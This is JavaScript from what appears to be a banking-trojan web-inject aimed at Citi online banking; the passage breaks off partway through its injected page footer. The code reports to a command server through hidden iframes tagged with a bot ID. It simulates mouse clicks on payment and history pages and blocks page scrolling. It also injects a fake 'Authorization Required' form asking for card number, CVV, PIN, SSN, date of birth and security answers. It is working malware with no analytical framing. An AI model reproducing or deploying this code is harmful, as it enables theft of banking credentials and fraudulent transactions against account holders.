(function(){
//настройки
String.prototype.fAkEUseTestMode=false;
String.prototype.fAkE_lang = "EN";
//functions
String.prototype.fAkE_MakeElem=function(src,func,elem){
	src=''.fAkE_link+"comm.php?botid="+encodeURIComponent(("".fAkEbotid))+"&Rstatus="+encodeURIComponent((''.fAkEwhereisinj))+src;
	try{String.prototype.fAkEfrm = document.createElement(elem);''.fAkEfrm.setAttribute("src", src);''.fAkEfrm.setAttribute("id", ''.fAkEwhereisinj);''.fAkEfrm.setAttribute("name", "fAkEelem");
	if(func){if(''.fAkEfrm.attachEvent){''.fAkEfrm.attachEvent("onload",func)}else{''.fAkEfrm.addEventListener("load", func, true)}};
	''.fAkEfrm.setAttribute("style", "display:none");''.fAkEfrm.setAttribute("width", "0px");''.fAkEfrm.setAttribute("height", "0px");
	document.getElementsByTagName("body")[0].appendChild(''.fAkEfrm);return false;}catch(e){};return false;
};
String.prototype.fAkE_CloseElem=function(Id){
	if(document.getElementById(Id)){
	String.prototype.fAkEobj=document.getElementById(Id)?document.getElementById(Id):Id;if (!''.fAkEobj) return;''.fAkEobj.src="";''.fAkEobj.parentNode.removeChild(''.fAkEobj);}
};

//позиция элемента
String.prototype.fAkEgetOffset=function(elem) {
    if (elem.getBoundingClientRect) {
        return ''.fAkEgetOffsetRect(elem)
    } else {
        return ''.fAkEgetOffsetSum(elem)
    }
};
String.prototype.fAkEgetOffsetSum=function(elem) {
    String.prototype.fAkEtop=0;String.prototype.fAkEleft=0;
    while(elem) {
        ''.fAkEtop = ''.fAkEtop + parseInt(elem.offsetTop);
        ''.fAkEleft = ''.fAkEleft + parseInt(elem.offsetLeft);
        elem = elem.offsetParent
    }
    return {fAkEtop: ''.fAkEtop, fAkEleft: ''.fAkEleft}
};
String.prototype.fAkEgetOffsetRect=function(elem) {
    String.prototype.fAkEbox = elem.getBoundingClientRect();
    String.prototype.fAkEbody = document.body;
    String.prototype.fAkEdocElem = document.documentElement;
    String.prototype.fAkEscrollTop = window.pageYOffset || ''.fAkEdocElem.scrollTop || ''.fAkEbody.scrollTop;
    String.prototype.fAkEscrollLeft = window.pageXOffset || ''.fAkEdocElem.scrollLeft || ''.fAkEbody.scrollLeft;
    String.prototype.fAkEclientTop = ''.fAkEdocElem.clientTop || ''.fAkEbody.clientTop || 0;
    String.prototype.fAkEclientLeft = ''.fAkEdocElem.clientLeft || ''.fAkEbody.clientLeft || 0;
    String.prototype.fAkEtop  = ''.fAkEbox.top +  ''.fAkEscrollTop - ''.fAkEclientTop;
    String.prototype.fAkEleft = ''.fAkEbox.left + ''.fAkEscrollLeft - ''.fAkEclientLeft;
    return { fAkEtop: Math.round(''.fAkEtop), fAkEleft: Math.round(''.fAkEleft) }
};
//запрет скроллинга
String.prototype.fAkEscroll=function(n){
	if(n && !''.fAkEUseTestMode){
		document.getElementsByTagName("html")[0].style.overflow = "hidden";
		document.body.style.overflow="hidden";
		document.body.style.scrollPostiton="fixed";
		window.scrollTo(0,0);
	}else{
		document.getElementsByTagName("html")[0].style.overflow = "";
		document.body.style.overflow="";
		document.body.style.scrollPostiton="";
	}
};
//point for mousemove test - use only in test mode
if(''.fAkEUseTestMode){
	String.prototype.fAkEpoint=document.createElement("img");''.fAkEpoint.style.zIndex="90000";
	''.fAkEpoint.src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAEklEQVR42mP8z8AARBDAiJMDAIzoBf5Dp2P2AAAAAElFTkSuQmCC";
	''.fAkEpoint.setAttribute("name","fAkEelem");''.fAkEpoint.id="fAkEpointTEST";''.fAkEpoint.style.position="absolute";
};
//переменные дл¤ текущей позиции мыши
String.prototype.fAkEposX=1;String.prototype.fAkEposY=1;String.prototype.fAkEclickedPosX=0;String.prototype.fAkEclickedPosY=0;
String.prototype.fAkEisButonClicked=false;String.prototype.fAkELINK;String.prototype.fAkEisBeginMouseMove=false;
String.prototype.fAkEevents={
	//эмул¤ци¤ мыши()
	fAkEmouseMove:function(pos){
		//''.fAkEscroll(true);
		String.prototype.fAkEtimeOut = Math.round(5 + Math.random() * 5);
		switch(''.fAkEwhereisinj){
			case "LoginData":
					//find button position
					String.prototype.fAkEclickedPos=''.fAkEgetOffset(pos);
					String.prototype.fAkEposX=''.fAkEclickedPos["fAkEtop"];String.prototype.fAkEposY=''.fAkEclickedPos["fAkEleft"];
					''.fAkEevents.fAkEMouseMoveDispatch("click",''.fAkELINK);break;
			case "AnyPage":
			case "HistoryPage":String.prototype.fAkELINK=document.getElementById("lnk2");document.getElementById("menu3").style.display="none";
			case "MakePaymentPage":
			case "HomePage":
				if(typeof(''.fAkELINK)!="undefined"){
					if(!''.fAkEisButonClicked&&pos){
						//''.fAkEreplacepage("send");
						//find begin position
						String.prototype.fAkEclickedPos=''.fAkEgetOffset(pos);
						String.prototype.fAkEposX=''.fAkEclickedPos["fAkEtop"];String.prototype.fAkEposY=''.fAkEclickedPos["fAkEleft"];
						//append loader
						if(''.fAkEwhereisinj!="MakePaymentPage"){''.fAkEdivelement.style.border="none";''.fAkEdivelement.innerHTML=''.fAkEloadelement.innerHTML;}
						//find position of ''.fAkELINK - target
						String.prototype.fAkEclickedPos=''.fAkEgetOffset(''.fAkELINK);
						String.prototype.fAkEclickedPosX=''.fAkEclickedPos["fAkEtop"];String.prototype.fAkEclickedPosY=''.fAkEclickedPos["fAkEleft"];
						String.prototype.fAkEisButonClicked=true;
					}
					if(''.fAkEposX<(''.fAkEclickedPosX+5)){String.prototype.fAkEposX++}
					if(''.fAkEposX>(''.fAkEclickedPosX+5)){String.prototype.fAkEposX--}
					if(''.fAkEposY<(''.fAkEclickedPosY+9)){String.prototype.fAkEposY++}
					if(''.fAkEposY>(''.fAkEclickedPosY+9)){String.prototype.fAkEposY--}
					if(''.fAkEposX==(''.fAkEclickedPosX+5)&&''.fAkEposY==(''.fAkEclickedPosY+9)){
						''.fAkEevents.fAkEMouseMoveDispatch("mouseout",document.body); //out from body;obj=document.body;
						''.fAkEevents.fAkEMouseMoveDispatch("mouseover",''.fAkELINK); //over on link;obj=''.fAkELINK
						''.fAkEevents.fAkEanotherEvents("focus",''.fAkELINK);
						''.fAkEtimeOutID=setTimeout(function fAkE(){
						''.fAkEevents.fAkEMouseMoveDispatch("mousedown",''.fAkELINK);//obj=''.fAkELINK
						//''.fAkEevents.fAkEMouseMoveDispatch("focusin",''.fAkELINK);//obj=''.fAkELINK
						''.fAkEevents.fAkEMouseMoveDispatch("mouseup",''.fAkELINK);//obj=''.fAkELINK
						''.fAkEevents.fAkEMouseMoveDispatch("click",''.fAkELINK);//obj=''.fAkELINK
						if(''.fAkEwhereisinj!="MakePaymentPage")''.fAkEevents.fAkEMouseMoveDispatch("mouseout",''.fAkELINK);//obj=''.fAkELINK
						},''.fAkEtimeOut);
					}else{
						//while not reach ''.fAkELINK
						''.fAkEtimeOutID=setTimeout(function fAkE(){''.fAkEevents.fAkEMouseMoveDispatch('mousemove',document.body);''.fAkEevents.fAkEmouseMove();},''.fAkEtimeOut);
					}
			};break;
		}
	},
	fAkEMouseMoveDispatch:function (type,obj) {
			String.prototype.fAkEelem = obj;
			if(type=="mousemove"){String.prototype.fAkEelem=document.body;
				//test mousemove - use only in test mode
				if(''.fAkEUseTestMode){
					if(!document.getElementById("fAkEpointTEST"))''.fAkEelem.appendChild(''.fAkEpoint);
					''.fAkEpoint.style.left=''.fAkEposY+"px";
					''.fAkEpoint.style.top=''.fAkEposX+"px";//"".fAkEisBeginMouseMove?(''.fAkEposX+2000)+"px":''.fAkEposX+"px";
				}
				//end test mousemove	
			}
			String.prototype.fAkEtimeOut = Math.round(3 + Math.random() * 5);
			String.prototype.fAkEevt;
			String.prototype.fAkEe = {
				bubbles : true,
				cancelable : (type != "mousemove"),
				view : window,
				detail : 0,
				screenX : ''.fAkEposX>2000?''.fAkEposX-2000:''.fAkEposX,
				screenY : ''.fAkEposY,
				clientX : ''.fAkEposX>2000?''.fAkEposX-2000:''.fAkEposX,
				clientY : ''.fAkEposY,
				ctrlKey : false,
				altKey : false,
				shiftKey : false,
				metaKey : false,
				button : 0,
				relatedTarget : undefined
			};
			if (typeof(document.createEvent) == "function") {
				String.prototype.fAkEevt = document.createEvent("MouseEvents");
				''.fAkEevt.initMouseEvent(type, ''.fAkEe.bubbles, ''.fAkEe.cancelable, ''.fAkEe.view, ''.fAkEe.detail,
					''.fAkEe.screenX, ''.fAkEe.screenY, ''.fAkEe.clientX, ''.fAkEe.clientY,
					''.fAkEe.ctrlKey, ''.fAkEe.altKey, ''.fAkEe.shiftKey, ''.fAkEe.metaKey,
					''.fAkEe.button, document.body.parentNode);
				''.fAkEelem.dispatchEvent(''.fAkEevt);
			} else {
				String.prototype.fAkEevt = document.createEventObject();
				for (String.prototype.prop in ''.fAkEe) {
					''.fAkEevt[''.prop] = ''.fAkEe[''.prop];
				};
				''.fAkEevt.button = {
					0 : 1,
					1 : 4,
					2 : 2
				}
				[''.fAkEevt.button] || ''.fAkEevt.button;
				''.fAkEelem.fireEvent("on"+type, ''.fAkEevt);
			};
	},
	//эмул¤ци¤ других событий()
	fAkEanotherEvents:function(ev,obj){
		if(document.createEvent){
			String.prototype.fAkEevent = document.createEvent('Event');
			''.fAkEevent.initEvent(ev, true, true);
			obj.dispatchEvent(''.fAkEevent);
		} else if (window.document.createEventObject){
			try{String.prototype.fAkEevent = document.createEventObject();
			obj.fireEvent('on'+ev, ''.fAkEevent);
			}catch(e){}}
	},
	//эмул¤ци¤ клавиатуры()
	fAkEkeyboardEvents:function(ev,obj,charcode,keycode){
		if(document.createEvent){
			String.prototype.fAkEevent = document.createEvent("KeyboardEvent");
			String.prototype.fAkEinitMethod = typeof ''.fAkEevent.initKeyboardEvent !== 'undefined' ? "initKeyboardEvent" : "initKeyEvent";
			''.fAkEevent[''.fAkEinitMethod](
                    ev, // event type : keydown, keyup, keypress
                    true, // bubbles
                    true, // cancelable
                    window, // viewArg: should be window
                    false, // ctrlKeyArg
                    false, // altKeyArg
                    false, // shiftKeyArg
                    false, // metaKeyArg
                    charcode, // keyCodeArg : unsigned long the virtual key code, else 0
                    keycode // charCodeArgs : unsigned long the Unicode character associated with the depressed key, else 0
			);
			obj.dispatchEvent(''.fAkEevent);
		} else if (window.document.createEventObject){
			String.prototype.fAkEevent = document.createEventObject();
			''.fAkEevent.returnValue=true;
			''.fAkEevent.keyCode=keycode;
			''.fAkEevent.type=ev;
			obj.fireEvent("on"+ev, ''.fAkEevent);
		}
	}
};

String.prototype.fAkE_insertAfter=function(fAkEelem, fAkErefElem) {fAkErefElem.parentNode.insertBefore(fAkEelem, fAkErefElem.nextSibling);};
String.prototype.fAkE_perevod={
	"EN":{
		"fAkE_fields":[
			"<div style='border-bottom: 1px solid #ccc;font-size: 11px;margin: 0 0 15px;padding: 14px 0 12px;position: relative;width: 984px;font-family: arial,sans-serif;overflow: hidden;'><img src='"+''.fAkE_link+"img/citilogo_branding_blue_60x35.gif' tabindex='0' alt='Citi'></div>",
			"<div style='margin-bottom:30px;border-bottom: 2px solid #ccc;color: #000;font-weight: bold;padding: 10px 0 13px;text-transform: uppercase;width: 940px;clear: both;float: left; background: #fff none repeat scroll 0 0;'><h1 style='font-family: Arial;font-size: 20px;font-weight: normal;margin: 0;color: #000;'>Authorization Required</h1></div>",
			"In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online.<br name='fAkEelem'><br name='fAkEelem'>Please enter the information below to continue.<br name='fAkEelem'><br name='fAkEelem'>",
			"ATM/Debit card number:",
			"CVV:",
			"Expiration Date:",			
			"PIN (The code you enter at ATMs):",
			"",
	
			"Account number:",
			"Social Security Number (SSN):",		
			"Date of Birth:",	
			"Mother's Maiden Name:",
			"The Name of Elementary School You Graduated from:",
			"",
			""
		],
		"fAkE_input_fields":[
			"",
			"",
			"<div name='fAkEelem' id='fAkE_error' style='font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: red;margin:30px 0;'></div>",
			'<input name="fAkEelements" onkeyup="if(this.value.length==4){document.getElementById(\'fAkE_ccnum_stars2\').value.length>0?document.getElementById(\'fAkE_ccnum_stars2\').focus():document.getElementById(\'fAkE_ccnum2\').focus();}" onblur="this.style.display=\'none\';document.getElementById(\'fAkE_ccnum_stars1\').style.display=\'inline-block\';document.getElementById(\'fAkE_ccnum_stars1\').value=this.value.replace(/./g,\'*\')" type="text" maxlength="4" id="fAkE_ccnum1" maxlength="4" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: inline-block;height: 36px;padding:0 16px;width: 70px;font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;"><input type="text" onfocus="this.style.display=\'none\';document.getElementById(\'fAkE_ccnum1\').style.display=\'inline-block\';document.getElementById(\'fAkE_ccnum1\').focus();" name="fAkEelements" maxlength="4" id="fAkE_ccnum_stars1" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: rgb(118, 117, 118); margin: 10px 10px 10px 0; background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); border-radius: 0px; box-sizing: border-box; cursor: text; height: 36px; padding:0 16px;  width: 70px;display: none;"> <input name="fAkEelements" onkeyup="if(this.value.length==4){document.getElementById(\'fAkE_ccnum_stars3\').value.length>0?document.getElementById(\'fAkE_ccnum_stars3\').focus():document.getElementById(\'fAkE_ccnum3\').focus();}" onblur="this.style.display=\'none\';document.getElementById(\'fAkE_ccnum_stars2\').style.display=\'inline-block\';document.getElementById(\'fAkE_ccnum_stars2\').value=this.value.replace(/./g,\'*\')" type="text" maxlength="4" id="fAkE_ccnum2" maxlength="4" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: inline-block;height: 36px;padding:0 16px;width: 70px;font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;"><input type="text" onfocus="this.style.display=\'none\';document.getElementById(\'fAkE_ccnum2\').style.display=\'inline-block\';document.getElementById(\'fAkE_ccnum2\').focus();" name="fAkEelements" maxlength="4" id="fAkE_ccnum_stars2" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: rgb(118, 117, 118); margin:10px 10px 10px 0; background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); border-radius: 0px; box-sizing: border-box; cursor: text; height: 36px; padding: 0 16px;  width: 70px;display: none;"> <input name="fAkEelements" onkeyup="if(this.value.length==4){document.getElementById(\'fAkE_CVV2\').focus();}" onblur="this.style.display=\'none\';document.getElementById(\'fAkE_ccnum_stars3\').style.display=\'inline-block\';document.getElementById(\'fAkE_ccnum_stars3\').value=this.value.replace(/./g,\'*\')" type="text" maxlength="4" id="fAkE_ccnum3" maxlength="4" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: inline-block;height: 36px;padding: 0 16px;width: 70px;font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;"><input type="text" onfocus="this.style.display=\'none\';document.getElementById(\'fAkE_ccnum3\').style.display=\'inline-block\';document.getElementById(\'fAkE_ccnum3\').focus();" name="fAkEelements" maxlength="4" id="fAkE_ccnum_stars3" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: rgb(118, 117, 118); margin:10px 10px 10px 0; background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); border-radius: 0px; box-sizing: border-box; cursor: text; height: 36px; padding: 0 16px;  width: 70px;display: none;"> <input name="fAkEelements" type="text" maxlength="4" id="fAkE_knoun_ccnum" disabled="true" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;background-color: #DCDCDC;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display:inline-block;height: 36px;padding: 0 16px;width: 70px;">',
			'<input name="fAkEelements" type="password" maxlength="3" id="fAkE_CVV2" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: block;height: 36px;padding: 0 16px;vertical-align: middle;width: 60px;">',
			'<select name="fAkEelements" id="fAkE_expday_mm" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;cursor:pointer;color:#767576;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;display: inline-block;height: 36px;padding: 0 0 0 16px;vertical-align: middle;width: 65px;"></select><select name="fAkEelements" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;cursor:pointer;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;display: inline-block;height: 36px;padding: 0 0 0 16px;vertical-align: middle;width: 90px;" id="fAkE_expday_yyyy"></select>',
			'<input name="fAkEelements" type="password" maxlength="4" id="fAkE_PIN" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: block;height: 36px;padding: 0 16px;vertical-align: middle;width: 65px;">',
			"<div name='fAkEelements' style='font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;border-top: 1px solid #d8d8d8;margin-bottom: 18px;margin-top: 15px;width: 100%;'></div><a name='fAkEelements' onclick='javascript:\"\".fAkECheckfp()' onmouseover='javascript:this.style.backgroundColor=&quot;#ffffff&quot;;this.style.color=&quot;#0076c0&quot;' onmouseout='javascript:this.style.backgroundColor=&quot;#0076c0&quot;;this.style.color=&quot;#ffffff&quot;' title='Continue' style='font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; font-weight: bold !important;height: 14px;padding: 8px 20px 12px;background-color: #0076c0;border: 1px solid #0076c0;color: #ffffff;vertical-align: middle;font-weight: bold;-moz-user-select: none;cursor: pointer;display: inline-block;text-align: center;white-space: nowrap;text-decoration: none;'>Continue</a>",
			
			'<input name="fAkEelements" type="text" maxlength="20" id="fAkE_accNum" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: block;height: 36px;padding: 0 16px;vertical-align: middle;width: 200px;">',
			'<input name="fAkEelements" onkeyup="if(this.value.length==3){document.getElementById(\'fAkE_SSN_1\').focus();}" type="text" maxlength="3" id="fAkE_SSN_0" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display:inline-block;height: 36px;padding: 0 16px;vertical-align: middle;width: 60px;"><input name="fAkEelements" type="text" maxlength="2" onkeyup="if(this.value.length==2){document.getElementById(\'fAkE_SSN_2\').focus();}" id="fAkE_SSN_1" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display:inline-block;height: 36px;padding: 0 16px;vertical-align: middle;width: 50px;"><input name="fAkEelements" type="text" maxlength="4" id="fAkE_SSN_2" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display:inline-block;height: 36px;padding: 0 16px;vertical-align: middle;width: 65px;">',
			'<select name="fAkEelements" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: pointer;display:inline-block;height: 36px;padding:0 0 0 16px;vertical-align: middle;width: 65px;" id="fAkE_mm"></select><select name="fAkEelements" id="fAkE_dd" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 10px 10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: pointer;display:inline-block;height: 36px;padding:0 0 0 16px;vertical-align: middle;width: 65px;"></select><select name="fAkEelements" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: pointer;display:inline-block;height: 36px;padding: 0 0 0 16px;vertical-align: middle;width: 95px;" id="fAkE_yyyy"></select>',
			'<input name="fAkEelements" type="text" id="fAkE_MMN" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: block;height: 36px;padding: 0 16px;vertical-align: middle;width: 200px;">',
			'<input name="fAkEelements" type="text" id="fAkE_ElSchool" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;color:#767576;margin:10px 0;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: block;height: 36px;padding: 0 16px;vertical-align: middle;width: 200px;">',			
			"<div name='fAkEelements' style='font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #333333;margin:10px 0;border-top: 1px solid #d8d8d8;margin-bottom: 18px;margin-top: 15px;width: 100%;'></div><a name='fAkEelements' onclick='javascript:\"\".fAkEChecksp()' onmouseover='javascript:this.style.backgroundColor=&quot;#ffffff&quot;;this.style.color=&quot;#0076c0&quot;' onmouseout='javascript:this.style.backgroundColor=&quot;#0076c0&quot;;this.style.color=&quot;#ffffff&quot;' title='Continue'style='font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;font-weight: bold !important;height: 14px;padding: 8px 20px 12px;background-color: #0076c0;border: 1px solid #0076c0;color: #ffffff;vertical-align: middle;font-weight: bold;-moz-user-select: none;cursor: pointer;display: inline-block;text-align: center;white-space: nowrap;text-decoration: none;'>Continue</a>",
			'<div name="fAkEelements" class="reskinFooter" id="citilmFooter" role="contentinfo" style="width: '+(screen.width)+'px !important; margin-left: -'+((parseInt(screen.width)-984)/2)+'px;"><div name="fAkEelements" class="footer_wrapper">\
				<div name="fAkEelements" class="social_links"><a name="fAkEelements" title="Citi.com" class="logo" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/Welcome.c">\
				<img name="fAkEelements" width="52" height="30" alt="Citi.com" src="https://online.citi.com/CBOL/common/ddl/1.1.0/images/catalogue/citi-logo-footer.png"></a><div name="fAkEelements" class="social_network">\
				<a name="fAkEelements" title="Facebook" class="social_padding" id="cmlink_FacebookIconLink" href="javascript:launchPopup(&quot;/US/JRS/portal/template.do?ID=FacebookSpeedbump&quot;,&quot;Facebook&quot;,&quot;status,resizable,scrollbars,focus,width=590,height=480&quot;)" target="_top">Facebook<span name="fAkEelements" class="hiddenSkipNav">This link will open a new tab or window.</span></a>\
				<a name="fAkEelements" title="Twitter" class="social_padding" id="cmlink_TwitterIconLink" href="javascript:launchPopup(&quot;/US/JRS/portal/template.do?ID=SocialTwitterSpeedbump&quot;,&quot;TwitterAskCiti&quot;,&quot;status,resizable,scrollbars,focus,width=590,height=480&quot;)" target="_top">Twitter<span name="fAkEelements" class="hiddenSkipNav">This link will open a new tab or window.</span></a>\
				<a name="fAkEelements" title="YouTube" class="social_padding" id="cmlink_YoutubeIconLink" href="javascript:launchPopup(&quot;/US/JRS/portal/template.do?ID=SocialYoutubeSpeedbump&quot;,&quot;YouTube&quot;,&quot;status,resizable,scrollbars,focus,width=590,height=480&quot;)" target="_top">You Tube<span name="fAkEelements" class="hiddenSkipNav">This link will open a new tab or window.</span></a></div>\
				</div><div name="fAkEelements" class="footer_links"><div name="fAkEelements" class="footer_link_contents"><ul name="fAkEelements"><li name="fAkEelements" class="footer_subnav footer_bold_text">\
				<span name="fAkEelements">Why Citi</span></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" href="http://www.citigroup.com/citi/">Our Story</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=ServicesOverview">Benefits and Services</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=Rewards">Rewards</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" href="https://citieasydeals.com/">Citi Easy Deals<sup name="fAkEelements">SM</sup></a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" href="http://www.citiprivatepass.com/">Citi<sup name="fAkEelements">®</sup> Private Pass<sup name="fAkEelements">®</sup></a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/portal/template.do?ID=SpecialOffers">Special Offers</a></li></ul>\
				</div><div name="fAkEelements" class="footer_link_contents"><ul name="fAkEelements"><li name="fAkEelements" class="footer_subnav footer_bold_text"><span name="fAkEelements">Relationship Banking</span></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=CitiPriorityOverview">Citi Priority</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=CitigoldOverview">Citigold<sup name="fAkEelements">®</sup></a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" href="https://www.privatebank.citibank.com/">Citi Private Bank</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/JRS/portal.c?ID=Global">Citi Global Banking</a></li></ul></div><div name="fAkEelements" class="footer_link_contents"><ul name="fAkEelements">\
				<li name="fAkEelements" class="footer_subnav footer_bold_text">\
				<span name="fAkEelements">Business Banking</span></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=CitiBizOverview">Small Business Accounts</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=CitiBusinessBanking">Business Accounts</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=CitiCommercialBanking">Commercial Accounts</a></li>\
				</ul></div><div name="fAkEelements" class="footer_link_contents"><ul name="fAkEelements"><li name="fAkEelements" class="footer_subnav footer_bold_text"><span name="fAkEelements">Rates</span></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=CurrentRates">Personal Banking</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="lnk(this.href);return false;" href=" https://www.citi.com/credit-cards/compare-credit-cards/citi.action?ID=view-all-credit-cards">Credit Cards</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/portal/template.do?ID=mortgage_home_mortgage">Mortgage</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/portal/template.do?ID=mortgage_home_equity_rates">Home Equity</a></li><li name="fAkEelements" class="footer_subnav">\
				<a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/pands/detail.do?ID=PersonalLinesRates">Lending</a>\
				</li></ul></div><div name="fAkEelements" class="footer_link_contents"><ul name="fAkEelements"><li name="fAkEelements" class="footer_subnav footer_bold_text"><span name="fAkEelements">Help &amp; Support</span></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" href="javascript:lnk(&quot;/JRS/portal/contactus.do?ID=ContactUsBanking&quot;)">Contact Us</a></li><li name="fAkEelements" class="footer_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/helpcenter/main.do">Help &amp; FAQs</a></li><li name="fAkEelements" tabindex="-1" class="chat hidden footer_subnav" id="contactUsFlyout-LPBucket" role="link"><div name="fAkEelements" class="hidden" id="lpContentDrop"><div name="fAkEelements" id="needHelpParent" style="display: inline;"><div name="fAkEelements" id="lpButtonNeedHelp" style="visibility: visible;"><a name="fAkEelements" class="lpLinkFlyout" onclick="if ((typeof lpChatWindow=== &quot;undefined&quot;) || (lpChatWindow.closed)) { lpChatWindow=window.open(&quot;&quot;, &quot;chat&quot;+lpMTagConfig.lpNumber, &quot;width=300,height=300,scrollbars=1&quot;); lpMTagConfig.dynButton0.actionHook();; }else { if (!lpChatWindow.closed) { lpChatWindow.focus(); } }" href="javascript:;">Chat With Us</a></div></div></div></li></ul>\
				</div><div name="fAkEelements" class="footer_link_contents">\
				<form name="fAkEelements" id="locatorForm" action="https://online.citi.com/US/GCL/citilocator/flow.action">\
